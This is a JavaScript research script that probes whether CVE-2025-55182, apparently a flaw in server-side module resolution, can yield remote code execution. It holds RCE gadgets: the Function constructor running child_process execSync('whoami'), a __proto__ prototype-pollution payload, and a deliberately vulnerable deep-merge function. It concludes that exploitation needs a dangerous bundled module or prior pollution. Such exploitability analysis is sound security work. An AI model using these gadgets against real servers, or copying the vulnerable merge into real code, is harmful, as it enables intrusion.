/**
 * Creative Exploitation Research for CVE-2025-55182
 *
 * Known constraints:
 * 1. bundlerConfig[id] must exist (module must be in manifest)
 * 2. moduleExports[name] gives ONE property access
 * 3. RCE needs TWO: obj.constructor.constructor to get Function
 *
 * Question: Can we get RCE with ONE property access?
 */

console.log("=== Creative Exploitation Research ===\n");

// Scenario 1: What if the module exports a Function directly?
console.log("--- Scenario 1: Module that exports a Function directly ---");
const moduleWithFunction = {
  default: Function,  // What if default IS the Function constructor?
};
console.log("moduleWithFunction.default:", moduleWithFunction.default);
console.log("Is Function:", moduleWithFunction.default === Function);
if (moduleWithFunction.default === Function) {
  try {
    const fn = moduleWithFunction.default('return process.mainModule.require("child_process").execSync("whoami").toString()');
    console.log("RCE Result:", fn());
  } catch(e) {
    console.log("Error:", e.message);
  }
}

// Scenario 2: What if a module exports eval?
console.log("\n--- Scenario 2: Module that exports eval ---");
const moduleWithEval = {
  evaluate: eval,
};
try {
  const result = moduleWithEval.evaluate('1+1');
  console.log("eval('1+1'):", result);
  // In strict mode, eval can't access outer scope easily
} catch(e) {
  console.log("Error:", e.message);
}

// Scenario 3: Symbol.toPrimitive or toString/valueOf tricks
console.log("\n--- Scenario 3: Symbol tricks ---");
const moduleWithSymbol = {
  myAction: async () => "hello",
};
// What prototype properties might be useful?
console.log("toString:", moduleWithSymbol['toString']);
console.log("valueOf:", moduleWithSymbol['valueOf']);
console.log("[Symbol.toPrimitive]:", moduleWithSymbol[Symbol.toPrimitive]);

// Scenario 4: What modules commonly have dangerous exports?
console.log("\n--- Scenario 4: Check real Node.js modules ---");

// util.promisify wraps functions - not directly exploitable
console.log("util.promisify:", require('util').promisify);

// What about require itself?
console.log("module.require:", module.require);
console.log("module.constructor:", module.constructor);

// Scenario 5: The real question - what modules export callable functions?
console.log("\n--- Scenario 5: Modules with callable default exports ---");
const stream = require('stream');
console.log("stream.Readable:", typeof stream.Readable); // class
console.log("stream.pipeline:", typeof stream.pipeline); // function

// Can we call these with arbitrary args for RCE?
// stream.pipeline needs streams - not useful

// Scenario 6: What about modules that call eval internally?
console.log("\n--- Scenario 6: Modules that use eval/Function internally ---");
// - vm.runInThisContext (we know this works)
// - ejs.render (if ejs is bundled)
// - pug.compile (if pug is bundled)

// Scenario 7: What if we can manipulate the arguments?
console.log("\n--- Scenario 7: Arguments manipulation ---");
// The bound args come from the attacker's JSON
// We control what arguments get passed to the function

// For RCE we need a function that:
// 1. Is exported by a bundled module
// 2. Takes user input and executes it as code

// Candidates:
// - vm.runInThisContext(code) ✓
// - vm.compileFunction(code) ✓
// - Function(args, body) ✓ - but is Function ever exported?
// - eval() - global, not exported
// - child_process.execSync(cmd) ✓
// - child_process.exec(cmd) ✓

// Scenario 8: Can we use JSON.parse to pollute before the vulnerable code runs?
console.log("\n--- Scenario 8: JSON-based prototype pollution ---");
// The flight protocol parses JSON for bound args
// Does it use JSON.parse or something custom?

// Testing JSON.parse behavior
const maliciousJSON = '{"__proto__": {"polluted": true}}';
const parsed = JSON.parse(maliciousJSON);
console.log("parsed.__proto__.polluted:", parsed.__proto__?.polluted);
console.log("Object.prototype.polluted:", Object.prototype.polluted);
// Standard JSON.parse doesn't pollute Object.prototype

// Scenario 9: What about merge/extend operations?
console.log("\n--- Scenario 9: Object spread/assign pollution ---");
const target = {};
const source = JSON.parse('{"__proto__": {"spreaded": true}}');
Object.assign(target, source);
console.log("After Object.assign, Object.prototype.spreaded:", Object.prototype.spreaded);
// Nope, doesn't work

// Deep merge libraries ARE vulnerable though
function vulnerableDeepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      vulnerableDeepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// This WOULD work:
// vulnerableDeepMerge({}, {"__proto__": {"pwned": true}});

console.log("\n=== CONCLUSIONS ===");
console.log(`
For CVE-2025-55182 to be exploitable, you need EITHER:

1. A dangerous module already in the webpack bundle that exports:
   - vm.runInThisContext, vm.compileFunction
   - child_process.execSync/exec/spawn
   - fs.readFileSync/writeFileSync
   - Function constructor (rare)

2. Pre-existing prototype pollution to add:
   - A dangerous function to Object.prototype
   - Example: Object.prototype.exec = child_process.execSync

3. A module with a callable export that internally uses eval/Function
   - Template engines (ejs, pug, handlebars)
   - Config parsers that eval
   - Custom code loaders

The key insight: The manifest is build-time, not runtime.
Attackers cannot inject modules into the manifest without:
- Compromising the build process
- Exploiting a prototype pollution vulnerability
- Finding a misconfigured bundler that includes node built-ins
`);

// Check if there's any way to get Function from prototype
console.log("\n=== Checking prototype chain for Function ===");
const obj = {};
console.log("obj.constructor:", obj.constructor);
console.log("obj.constructor.constructor:", obj.constructor.constructor);
console.log("Is Function:", obj.constructor.constructor === Function);

// So obj['constructor']['constructor'] gives Function
// But we only get ONE access with the vulnerability!
// obj['constructor'] gives [Function: Object] - NOT callable for RCE
